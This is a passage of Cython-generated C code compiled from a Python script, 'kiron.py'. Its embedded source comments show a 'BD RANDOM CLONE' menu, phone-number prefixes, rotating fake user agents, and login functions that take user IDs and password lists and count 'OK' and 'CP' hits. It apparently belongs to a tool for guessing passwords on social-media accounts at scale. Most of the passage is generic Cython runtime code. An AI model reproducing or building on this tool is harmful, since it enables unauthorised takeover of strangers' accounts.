6','Redmi 7','Redmi 8','Redmi 9','Redmi A1','Redmi A2','Redmi A3','Redmi K30','Redmi K40','Redmi K50','Redmi K60','Redmi note','Redmi Note 1','Redmi Note 10Redmi Note 11','Redmi Note 12','Redmi Note 12T','Redmi Note 13','Redmi Note 15 Pro','Redmi Note 2','Redmi Note 3','Redmi Note 4','Redmi Note 5','Redmi Note 5 Pro','Redmi Note 6','Redmi Note 7','Redmi Note 7 Pro','Redmi Note 8 Pro','Redmi Note 8T','Redmi Note 9','Redmi Note 9 5G','Redmi Note 9 Pro','Redmi Note 9 Pro 5G','Redmi Note 9 Pro Max','Redmi Note 9S','Redmi Note 9T','Redmi Note 9T 5G','Redmi Note Prime','Redmi Note10','Redmi Note10T','Redmi Note7','Redmi Note8','Redmi Note8T','Redmi Note9','Redmi Pad','Redmi Pro','Redmi S2','Redmi X','Redmi Y1','Redmi Y1 Lite','Redmi Y2','Redmi Y3','Redmi 2', 'Redmi 3', 'Redmi 3S', 'Redmi 4', 'Redmi 4A', 'Redmi 4X', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 4X', 'Redmi Note 5', 'Redmi Note 5 Pro', 'Redmi Note 5A', 'Redmi Note 5A Prime', 'Redmi S2', 'Redmi Y1', 'Redmi Y1 Lite', 'Redmi Y2', 'Rex 60', 'Rex 80', 'Rhyme', 'RM-560', 'Ruby'])
 */
  __pyx_t_3 = __Pyx_CyFunction_New(&__pyx_mdef_5kiron_21usergent, 0, __pyx_n_s_usergent, NULL, __pyx_n_s_kiron, __pyx_d, ((PyObject *)__pyx_codeobj__150)); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 335, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_usergent, __pyx_t_3) < 0) __PYX_ERR(0, 335, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  /* "kiron.py":357
 *      ua = random.choice([cudiua1,cudiua2,cudiua3,cudiua4,cudiua5,cudiua6,cudiua7,cudiua8])
 *      return ua
 * def rnd():             # <<<<<<<<<<<<<<
 *     clear()
 *     print('\x1b[38;5;244m[\x1b[1;97m1\x1b[38;5;244m]\x1b[38;5;46m BD RANDOM CLONE')
 */
  __pyx_t_3 = __Pyx_CyFunction_New(&__pyx_mdef_5kiron_23rnd, 0, __pyx_n_s_rnd, NULL, __pyx_n_s_kiron, __pyx_d, ((PyObject *)__pyx_codeobj__152)); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 357, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_rnd, __pyx_t_3) < 0) __PYX_ERR(0, 357, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  /* "kiron.py":372
 *         menu()
 * #[ BANGLADESH ]#
 * def BD():             # <<<<<<<<<<<<<<
 *         clear()
 *         print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46m EXAMPLE :\x1b[38;5;46m 01768 - 01831 - 01945 - 01634')
 */
  __pyx_t_3 = __Pyx_CyFunction_New(&__pyx_mdef_5kiron_25BD, 0, __pyx_n_s_BD, NULL, __pyx_n_s_kiron, __pyx_d, ((PyObject *)__pyx_codeobj__154)); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 372, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_BD, __pyx_t_3) < 0) __PYX_ERR(0, 372, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  /* "kiron.py":401
 *         linex()
 * #[ RAND MTD NO.1 ]#
 * def idpaslogin(uid,passlist,tl):             # <<<<<<<<<<<<<<
 *         global loop,oks,cps
 *         sys.stdout.write(f"\r\x1b[38;5;244m[\x1b[38;5;46mAYYUB-XD\x1b[38;5;244m] \x1b[38;5;244m[\x1b[38;5;81m{loop}\x1b[38;5;244m] \x1b[38;5;46mOK\033[1;37m|\x1b[38;5;46m{len(oks)} \x1b[38;5;81mCP\033[1;37m|\x1b[38;5;81m{len(cps)} ");sys.stdout.flush()
 */
  __pyx_t_3 = __Pyx_CyFunction_New(&__pyx_mdef_5kiron_27idpaslogin, 0, __pyx_n_s_idpaslogin, NULL, __pyx_n_s_kiron, __pyx_d, ((PyObject *)__pyx_codeobj__156)); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 401, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_idpaslogin, __pyx_t_3) < 0) __PYX_ERR(0, 401, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  /* "kiron.py":467
 *             time.sleep(10)
 * #__________________| FILE METHOD M1 |__________________#
 * def api1(ids,names,passlist):             # <<<<<<<<<<<<<<
 *         try:
 *                 global oks,loop,sim_id,device
 */
  __pyx_t_3 = __Pyx_CyFunction_New(&__pyx_mdef_5kiron_29api1, 0, __pyx_n_s_api1, NULL, __pyx_n_s_kiron, __pyx_d, ((PyObject *)__pyx_codeobj__158)); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 467, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_api1, __pyx_t_3) < 0) __PYX_ERR(0, 467, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  /* "kiron.py":571
 *                 time.sleep(10)
 * #__________________| FILE METHOD M2 |__________________#
 * def api2(ids,names,passlist):             # <<<<<<<<<<<<<<
 *         try:
 *                 global oks,loop,sim_id
 */
  __pyx_t_3 = __Pyx_CyFunction_New(&__pyx_mdef_5kiron_31api2, 0, __pyx_n_s_api2, NULL, __pyx_n_s_kiron, __pyx_d, ((PyObject *)__pyx_codeobj__159)); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 571, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_api2, __pyx_t_3) < 0) __PYX_ERR(0, 571, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  /* "kiron.py":676
 *                 time.sleep(10)
 * #__________________| END |__________________#
 * approval()             # <<<<<<<<<<<<<<
 */
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_approval); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 676, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_7 = __Pyx_PyObject_CallNoArg(__pyx_t_3); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 676, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

  /* "kiron.py":1
 * #__________________| IMPORT |__________________#             # <<<<<<<<<<<<<<
 * from os import path
 * import requests,random,uuid,string,hashlib,json
 */
  __pyx_t_7 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_test, __pyx_t_7) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

  /*--- Wrapped vars code ---*/

  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_7);
  __Pyx_XDECREF(__pyx_t_8);
  __Pyx_XDECREF(__pyx_t_10);
  __Pyx_XDECREF(__pyx_t_24);
  if (__pyx_m) {
    if (__pyx_d && stringtab_initialized) {
      __Pyx_AddTraceback("init kiron", __pyx_clineno, __pyx_lineno, __pyx_filename);
    }
    #if !CYTHON_USE_MODULE_STATE
    Py_CLEAR(__pyx_m);
    #else
    Py_DECREF(__pyx_m);
    if (pystate_addmodule_run) {
      PyObject *tp, *value, *tb;
      PyErr_Fetch(&tp, &value, &tb);
      PyState_RemoveModule(&__pyx_moduledef);
      PyErr_Restore(tp, value, tb);
    }
    #endif
  } else if (!PyErr_Occurred()) {
    PyErr_SetString(PyExc_ImportError, "init kiron");
  }
  __pyx_L0:;
  __Pyx_RefNannyFinishContext();
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  return (__pyx_m != NULL) ? 0 : -1;
  #elif PY_MAJOR_VERSION >= 3
  return __pyx_m;
  #else
  return;
  #endif
}
/* #### Code section: cleanup_globals ### */
/* #### Code section: cleanup_module ### */
/* #### Code section: main_method ### */
/* #### Code section: utility_code_pragmas ### */
#ifdef _MSC_VER
#pragma warning( push )
/* Warning 4127: conditional expression is constant
 * Cython uses constant conditional expressions to allow in inline functions to be optimized at
 * compile-time, so this warning is not useful
 */
#pragma warning( disable : 4127 )
#endif



/* #### Code section: utility_code_def ### */

/* --- Runtime support code --- */
/* Refnanny */
#if CYTHON_REFNANNY
static __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname) {
    PyObject *m = NULL, *p = NULL;
    void *r = NULL;
    m = PyImport_ImportModule(modname);
    if (!m) goto end;
    p = PyObject_GetAttrString(m, "RefNannyAPI");
    if (!p) goto end;
    r = PyLong_AsVoidPtr(p);
end:
    Py_XDECREF(p);
    Py_XDECREF(m);
    return (__Pyx_RefNannyAPIStruct *)r;
}
#endif

/* PyErrExceptionMatches */
#if CYTHON_FAST_THREAD_STATE
static int __Pyx_PyErr_ExceptionMatchesTuple(PyObject *exc_type, PyObject *tuple) {
    Py_ssize_t i, n;
    n = PyTuple_GET_SIZE(tuple);
#if PY_MAJOR_VERSION >= 3
    for (i=0; i<n; i++) {
        if (exc_type == PyTuple_GET_ITEM(tuple, i)) return 1;
    }
#endif
    for (i=0; i<n; i++) {
        if (__Pyx_PyErr_GivenExceptionMatches(exc_type, PyTuple_GET_ITEM(tuple, i))) return 1;
    }
    return 0;
}
static CYTHON_INLINE int __Pyx_PyErr_ExceptionMatchesInState(PyThreadState* tstate, PyObject* err) {
    int result;
    PyObject *exc_type;
#if PY_VERSION_HEX >= 0x030C00A6
    PyObject *current_exception = tstate->current_exception;
    if (unlikely(!current_exception)) return 0;
    exc_type = (PyObject*) Py_TYPE(current_exception);
    if (exc_type == err) return 1;
#else
    exc_type = tstate->curexc_type;
    if (exc_type == err) return 1;
    if (unlikely(!exc_type)) return 0;
#endif
    #if CYTHON_AVOID_BORROWED_REFS
    Py_INCREF(exc_type);
    #endif
    if (unlikely(PyTuple_Check(err))) {
        result = __Pyx_PyErr_ExceptionMatchesTuple(exc_type, err);
    } else {
        result = __Pyx_PyErr_GivenExceptionMatches(exc_type, err);
    }
    #if CYTHON_AVOID_BORROWED_REFS
    Py_DECREF(exc_type);
    #endif
    return result;
}
#endif

/* PyErrFetchRestore */
#if CYTHON_FAST_THREAD_STATE
static CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb) {
#if PY_VERSION_HEX >= 0x030C00A6
    PyObject *tmp_value;
    assert(type == NULL || (value != NULL && type == (PyObject*) Py_TYPE(value)));
    if (value) {
        #if CYTHON_COMPILING_IN_CPYTHON
        if (unlikely(((PyBaseExceptionObject*) value)->traceback != tb))
        #endif
            PyException_SetTraceback(value, tb);
    }
    tmp_value = tstate->current_exception;
    tstate->current_exception = value;
    Py_XDECREF(tmp_value);
    Py_XDECREF(type);
    Py_XDECREF(tb);
#else
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    tmp_type = tstate->curexc_type;
    tmp_value = tstate->curexc_value;
    tmp_tb = tstate->curexc_traceback;
    tstate->curexc_type = type;
    tstate->curexc_value = value;
    tstate->curexc_traceback = tb;
    Py_XDECREF(tmp_type);
    Py_XDECREF(tmp_value);
    Py_XDECREF(tmp_tb);
#endif
}
static CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {
#if PY_VERSION_HEX >= 0x030C00A6
    PyObject* exc_value;
    exc_value = tstate->current_exception;
    tstate->current_exception = 0;
    *value = exc_value;
    *type = NULL;
    *tb = NULL;
    if (exc_value) {
        *type = (PyObject*) Py_TYPE(exc_value);
        Py_INCREF(*type);
        #if CYTHON_COMPILING_IN_CPYTHON
        *tb = ((PyBaseExceptionObject*) exc_value)->traceback;
        Py_XINCREF(*tb);
        #else
        *tb = PyException_GetTraceback(exc_value);
        #endif
    }
#else
    *type = tstate->curexc_type;
    *value = tstate->curexc_value;
    *tb = tstate->curexc_traceback;
    tstate->curexc_type = 0;
    tstate->curexc_value = 0;
    tstate->curexc_traceback = 0;
#endif
}
#endif

/* PyObjectGetAttrStr */
#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name) {
    PyTypeObject* tp = Py_TYPE(obj);
    if (likely(tp->tp_getattro))
        return tp->tp_getattro(obj, attr_name);
#if PY_MAJOR_VERSION < 3
    if (likely(tp->tp_getattr))
        return tp->tp_getattr(obj, PyString_AS_STRING(attr_name));
#endif
    return PyObject_GetAttr(obj, attr_name);
}
#endif

/* PyObjectGetAttrStrNoError */
#if __PYX_LIMITED_VERSION_HEX < 0x030d00A1
static void __Pyx_PyObject_GetAttrStr_ClearAttributeError(void) {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    if (likely(__Pyx_PyErr_ExceptionMatches(PyExc_AttributeError)))
        __Pyx_PyErr_Clear();
}
#endif
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStrNoError(PyObject* obj, PyObject* attr_name) {
    PyObject *result;
#if __PYX_LIMITED_VERSION_HEX >= 0x030d00A1
    (void) PyObject_GetOptionalAttr(obj, attr_name, &result);
    return result;
#else
#if CYTHON_COMPILING_IN_CPYTHON && CYTHON_USE_TYPE_SLOTS && PY_VERSION_HEX >= 0x030700B1
    PyTypeObject* tp = Py_TYPE(obj);
    if (likely(tp->tp_getattro == PyObject_GenericGetAttr)) {
        return _PyObject_GenericGetAttrWithDict(obj, attr_name, NULL, 1);
    }
#endif
    result = __Pyx_PyObject_GetAttrStr(obj, attr_name);
    if (unlikely(!result)) {
        __Pyx_PyObject_GetAttrStr_ClearAttributeError();
    }
    return result;
#endif
}

/* GetBuiltinName */
static PyObject *__Pyx_GetBuiltinName(PyObject *name) {
    PyObject* result = __Pyx_PyObject_GetAttrStrNoError(__pyx_b, name);
    if (unlikely(!result) && !PyErr_Occurred()) {
        PyErr_Format(PyExc_NameError,
#if PY_MAJOR_VERSION >= 3
            "name '%U' is not defined", name);
#else
            "name '%.200s' is not defined", PyString_AS_STRING(name));
#endif
    }
    return result;
}

/* TupleAndListFromArray */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE void __Pyx_copy_object_array(PyObject *const *CYTHON_RESTRICT src, PyObject** CYTHON_RESTRICT dest, Py_ssize_t length) {
    PyObject *v;
    Py_ssize_t i;
    for (i = 0; i < length; i++) {
        v = dest[i] = src[i];
        Py_INCREF(v);
    }
}
static CYTHON_INLINE PyObject *
__Pyx_PyTuple_FromArray(PyObject *const *src, Py_ssize_t n)
{
    PyObject *res;
    if (n <= 0) {
        Py_INCREF(__pyx_empty_tuple);
        return __pyx_empty_tuple;
    }
    res = PyTuple_New(n);
    if (unlikely(res == NULL)) return NULL;
    __Pyx_copy_object_array(src, ((PyTupleObject*)res)->ob_item, n);
    return res;
}
static CYTHON_INLINE PyObject *
__Pyx_PyList_FromArray(PyObject *const *src, Py_ssize_t n)
{
    PyObject *res;
    if (n <= 0) {
        return PyList_New(0);
    }
    res = PyList_New(n);
    if (unlikely(res == NULL)) return NULL;
    __Pyx_copy_object_array(src, ((PyListObject*)res)->ob_item, n);
    return res;
}
#endif

/* BytesEquals */
static CYTHON_INLINE int __Pyx_PyBytes_Equals(PyObject* s1, PyObject* s2, int equals) {
#if CYTHON_COMPILING_IN_PYPY || CYTHON_COMPILING_IN_LIMITED_API
    return PyObject_RichCompareBool(s1, s2, equals);
#else
    if (s1 == s2) {
        return (equals == Py_EQ);
    } else if (PyBytes_CheckExact(s1) & PyBytes_CheckExact(s2)) {
        const char *ps1, *ps2;
        Py_ssize_t length = PyBytes_GET_SIZE(s1);
        if (length != PyBytes_GET_SIZE(s2))
            return (equals == Py_NE);
        ps1 = PyBytes_AS_STRING(s1);
        ps2 = PyBytes_AS_STRING(s2);
        if (ps1[0] != ps2[0]) {
            return (equals == Py_NE);
        } else if (length == 1) {
            return (equals == Py_EQ);
        } else {
            int result;
#if CYTHON_USE_UNICODE_INTERNALS && (PY_VERSION_HEX < 0x030B0000)
            Py_hash_t hash1, hash2;
            hash1 = ((PyBytesObject*)s1)->ob_shash;
            hash2 = ((PyBytesObject*)s2)->ob_shash;
            if (hash1 != hash2 && hash1 != -1 && hash2 != -1) {
                return (equals == Py_NE);
            }
#endif
            result = memcmp(ps1, ps2, (size_t)length);
            return (equals == Py_EQ) ? (result == 0) : (result != 0);
        }
    } else if ((s1 == Py_None) & PyBytes_CheckExact(s2)) {
        return (equals == Py_NE);
    } else if ((s2 == Py_None) & PyBytes_CheckExact(s1)) {
        return (equals == Py_NE);
    } else {
        int result;
        PyObject* py_result = PyObject_RichCompare(s1, s2, equals);
        if (!py_result)
            return -1;
        result = __Pyx_PyObject_IsTrue(py_result);
        Py_DECREF(py_result);
        return result;
    }
#endif
}

/* UnicodeEquals */
static CYTHON_INLINE int __Pyx_PyUnicode_Equals(PyObject* s1, PyObject* s2, int equals) {
#if CYTHON_COMPILING_IN_PYPY || CYTHON_COMPILING_IN_LIMITED_API
    return PyObject_RichCompareBool(s1, s2, equals);
#else
#if PY_MAJOR_VERSION < 3
    PyObject* owned_ref = NULL;
#endif
    int s1_is_unicode, s2_is_unicode;
    if (s1 == s2) {
        goto return_eq;
    }
    s1_is_unicode = PyUnicode_CheckExact(s1);
    s2_is_unicode = PyUnicode_CheckExact(s2);
#if PY_MAJOR_VERSION < 3
    if ((s1_is_unicode & (!s2_is_unicode)) && PyString_CheckExact(s2)) {
        owned_ref = PyUnicode_FromObject(s2);
        if (unlikely(!owned_ref))
            return -1;
        s2 = owned_ref;
        s2_is_unicode = 1;
    } else if ((s2_is_unicode & (!s1_is_unicode)) && PyString_CheckExact(s1)) {
        owned_ref = PyUnicode_FromObject(s1);
        if (unlikely(!owned_ref))
            return -1;
        s1 = owned_ref;
        s1_is_unicode = 1;
    } else if (((!s2_is_unicode) & (!s1_is_unicode))) {
        return __Pyx_PyBytes_Equals(s1, s2, equals);
    }
#endif
    if (s1_is_unicode & s2_is_unicode) {
        Py_ssize_t length;
        int kind;
        void *data1, *data2;
        if (unlikely(__Pyx_PyUnicode_READY(s1) < 0) || unlikely(__Pyx_PyUnicode_READY(s2) < 0))
            return -1;
        length = __Pyx_PyUnicode_GET_LENGTH(s1);
        if (length != __Pyx_PyUnicode_GET_LENGTH(s2)) {
            goto return_ne;
        }
#if CYTHON_USE_UNICODE_INTERNALS
        {
            Py_hash_t hash1, hash2;
        #if CYTHON_PEP393_ENABLED
            hash1 = ((PyASCIIObject*)s1)->hash;
            hash2 = ((PyASCIIObject*)s2)->hash;
        #else
            hash1 = ((PyUnicodeObject*)s1)->hash;
            hash2 = ((PyUnicodeObject*)s2)->hash;
        #endif
            if (hash1 != hash2 && hash1 != -1 && hash2 != -1) {
                goto return_ne;
            }
        }
#endif
        kind = __Pyx_PyUnicode_KIND(s1);
        if (kind != __Pyx_PyUnicode_KIND(s2)) {
            goto return_ne;
        }
        data1 = __Pyx_PyUnicode_DATA(s1);
        data2 = __Pyx_PyUnicode_DATA(s2);
        if (__Pyx_PyUnicode_READ(kind, data1, 0) != __Pyx_PyUnicode_READ(kind, data2, 0)) {
            goto return_ne;
        } else if (length == 1) {
            goto return_eq;
        } else {
            int result = memcmp(data1, data2, (size_t)(length * kind));
            #if PY_MAJOR_VERSION < 3
            Py_XDECREF(owned_ref);
            #endif
            return (equals == Py_EQ) ? (result == 0) : (result != 0);
        }
    } else if ((s1 == Py_None) & s2_is_unicode) {
        goto return_ne;
    } else if ((s2 == Py_None) & s1_is_unicode) {
        goto return_ne;
    } else {
        int result;
        PyObject* py_result = PyObject_RichCompare(s1, s2, equals);
        #if PY_MAJOR_VERSION < 3
        Py_XDECREF(owned_ref);
        #endif
        if (!py_result)
            return -1;
        result = __Pyx_PyObject_IsTrue(py_result);
        Py_DECREF(py_result);
        return result;
    }
return_eq:
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(owned_ref);
    #endif
    return (equals == Py_EQ);
return_ne:
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(owned_ref);
    #endif
    return (equals == Py_NE);
#endif
}

/* fastcall */
#if CYTHON_METH_FASTCALL
static CYTHON_INLINE PyObject * __Pyx_GetKwValue_FASTCALL(PyObject *kwnames, PyObject *const *kwvalues, PyObject *s)
{
    Py_ssize_t i, n = PyTuple_GET_SIZE(kwnames);
    for (i = 0; i < n; i++)
    {
        if (s == PyTuple_GET_ITEM(kwnames, i)) return kwvalues[i];
    }
    for (i = 0; i < n; i++)
    {
        int eq = __Pyx_PyUnicode_Equals(s, PyTuple_GET_ITEM(kwnames, i), Py_EQ);
        if (unlikely(eq != 0)) {
            if (unlikely(eq < 0)) return NULL;
            return kwvalues[i];
        }
    }
    return NULL;
}
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030d0000
CYTHON_UNUSED static PyObject *__Pyx_KwargsAsDict_FASTCALL(PyObject *kwnames, PyObject *const *kwvalues) {
    Py_ssize_t i, nkwargs = PyTuple_GET_SIZE(kwnames);
    PyObject *dict;
    dict = PyDict_New();
    if (unlikely(!dict))
        return NULL;
    for (i=0; i<nkwargs; i++) {
        PyObject *key = PyTuple_GET_ITEM(kwnames, i);
        if (unlikely(PyDict_SetItem(dict, key, kwvalues[i]) < 0))
            goto bad;
    }
    return dict;
bad:
    Py_DECREF(dict);
    return NULL;
}
#endif
#endif

/* PyDictVersioning */
#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj) {
    PyObject *dict = Py_TYPE(obj)->tp_dict;
    return likely(dict) ? __PYX_GET_DICT_VERSION(dict) : 0;
}
static CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj) {
    PyObject **dictptr = NULL;
    Py_ssize_t offset = Py_TYPE(obj)->tp_dictoffset;
    if (offset) {
#if CYTHON_COMPILING_IN_CPYTHON
        dictptr = (likely(offset > 0)) ? (PyObject **) ((char *)obj + offset) : _PyObject_GetDictPtr(obj);
#else
        dictptr = _PyObject_GetDictPtr(obj);
#endif
    }
    return (dictptr && *dictptr) ? __PYX_GET_DICT_VERSION(*dictptr) : 0;
}
static CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version) {
    PyObject *dict = Py_TYPE(obj)->tp_dict;
    if (unlikely(!dict) || unlikely(tp_dict_version != __PYX_GET_DICT_VERSION(dict)))
        return 0;
    return obj_dict_version == __Pyx_get_object_dict_version(obj);
}
#endif

/* GetModuleGlobalName */
#if CYTHON_USE_DICT_VERSIONS
static PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value)
#else
static CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name)
#endif
{
    PyObject *result;
#if !CYTHON_AVOID_BORROWED_REFS
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1 && PY_VERSION_HEX < 0x030d0000
    result = _PyDict_GetItem_KnownHash(__pyx_d, name, ((PyASCIIObject *) name)->hash);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    } else if (unlikely(PyErr_Occurred())) {
        return NULL;
    }
#elif CYTHON_COMPILING_IN_LIMITED_API
    if (unlikely(!__pyx_m)) {
        return NULL;
    }
    result = PyObject_GetAttr(__pyx_m, name);
    if (likely(result)) {
        return result;
    }
#else
    result = PyDict_GetItem(__pyx_d, name);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    }
#endif
#else
    result = PyObject_GetItem(__pyx_d, name);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    }
    PyErr_Clear();
#endif
    return __Pyx_GetBuiltinName(name);
}

/* PyFunctionFastCall */
#if CYTHON_FAST_PYCALL && !CYTHON_VECTORCALL
static PyObject* __Pyx_PyFunction_FastCallNoKw(PyCodeObject *co, PyObject **args, Py_ssize_t na,
                                               PyObject *globals) {
    PyFrameObject *f;
    PyThreadState *tstate = __Pyx_PyThreadState_Current;
    PyObject **fastlocals;
    Py_ssize_t i;
    PyObject *result;
    assert(globals != NULL);
    /* XXX Perhaps we should create a specialized
       PyFrame_New() that doesn't take locals, but does
       take builtins without sanity checking them.
       */
    assert(tstate != NULL);
    f = PyFrame_New(tstate, co, globals, NULL);
    if (f == NULL) {
        return NULL;
    }
    fastlocals = __Pyx_PyFrame_GetLocalsplus(f);
    for (i = 0; i < na; i++) {
        Py_INCREF(*args);
        fastlocals[i] = *args++;
    }
    result = PyEval_EvalFrameEx(f,0);
    ++tstate->recursion_depth;
    Py_DECREF(f);
    --tstate->recursion_depth;
    return result;
}
static PyObject *__Pyx_PyFunction_FastCallDict(PyObject *func, PyObject **args, Py_ssize_t nargs, PyObject *kwargs) {
    PyCodeObject *co = (PyCodeObject *)PyFunction_GET_CODE(func);
    PyObject *globals = PyFunction_GET_GLOBALS(func);
    PyObject *argdefs = PyFunction_GET_DEFAULTS(func);
    PyObject *closure;
#if PY_MAJOR_VERSION >= 3
    PyObject *kwdefs;
#endif
    PyObject *kwtuple, **k;
    PyObject **d;
    Py_ssize_t nd;
    Py_ssize_t nk;
    PyObject *result;
    assert(kwargs == NULL || PyDict_Check(kwargs));
    nk = kwargs ? PyDict_Size(kwargs) : 0;
    #if PY_MAJOR_VERSION < 3
    if (unlikely(Py_EnterRecursiveCall((char*)" while calling a Python object"))) {
        return NULL;
    }
    #else
    if (unlikely(Py_EnterRecursiveCall(" while calling a Python object"))) {
        return NULL;
    }
    #endif
    if (
#if PY_MAJOR_VERSION >= 3
            co->co_kwonlyargcount == 0 &&
#endif
            likely(kwargs == NULL || nk == 0) &&
            co->co_flags == (CO_OPTIMIZED | CO_NEWLOCALS | CO_NOFREE)) {
        if (argdefs == NULL && co->co_argcount == nargs) {
            result = __Pyx_PyFunction_FastCallNoKw(co, args, nargs, globals);
            goto done;
        }
        else if (nargs == 0 && argdefs != NULL
                 && co->co_argcount == Py_SIZE(argdefs)) {
            /* function called with no arguments, but all parameters have
               a default value: use default values as arguments .*/
            args = &PyTuple_GET_ITEM(argdefs, 0);
            result =__Pyx_PyFunction_FastCallNoKw(co, args, Py_SIZE(argdefs), globals);
            goto done;
        }
    }
    if (kwargs != NULL) {
        Py_ssize_t pos, i;
        kwtuple = PyTuple_New(2 * nk);
        if (kwtuple == NULL) {
            result = NULL;
            goto done;
        }
        k = &PyTuple_GET_ITEM(kwtuple, 0);
        pos = i = 0;
        while (PyDict_Next(kwargs, &pos, &k[i], &k[i+1])) {
            Py_INCREF(k[i]);
            Py_INCREF(k[i+1]);
            i += 2;
        }
        nk = i / 2;
    }
    else {
        kwtuple = NULL;
        k = NULL;
    }
    closure = PyFunction_GET_CLOSURE(func);
#if PY_MAJOR_VERSION >= 3
    kwdefs = PyFunction_GET_KW_DEFAULTS(func);
#endif
    if (argdefs != NULL) {
        d = &PyTuple_GET_ITEM(argdefs, 0);
        nd = Py_SIZE(argdefs);
    }
    else {
        d = NULL;
        nd = 0;
    }
#if PY_MAJOR_VERSION >= 3
    result = PyEval_EvalCodeEx((PyObject*)co, globals, (PyObject *)NULL,
                               args, (int)nargs,
                               k, (int)nk,
                               d, (int)nd, kwdefs, closure);
#else
    result = PyEval_EvalCodeEx(co, globals, (PyObject *)NULL,
                               args, (int)nargs,
                               k, (int)nk,
                               d, (int)nd, closure);
#endif
    Py_XDECREF(kwtuple);
done:
    Py_LeaveRecursiveCall();
    return result;
}
#endif

/* PyObjectCall */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw) {
    PyObject *result;
    ternaryfunc call = Py_TYPE(func)->tp_call;
    if (unlikely(!call))
        return PyObject_Call(func, arg, kw);
    #if PY_MAJOR_VERSION < 3
    if (unlikely(Py_EnterRecursiveCall((char*)" while calling a Python object")))
        return NULL;
    #else
    if (unlikely(Py_EnterRecursiveCall(" while calling a Python object")))
        return NULL;
    #endif
    result = (*call)(func, arg, kw);
    Py_LeaveRecursiveCall();
    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {
        PyErr_SetString(
            PyExc_SystemError,
            "NULL result without error in PyObject_Call");
    }
    return result;
}
#endif

/* PyObjectCallMethO */
#if CYTHON_COMPILING_IN_CPYTHON
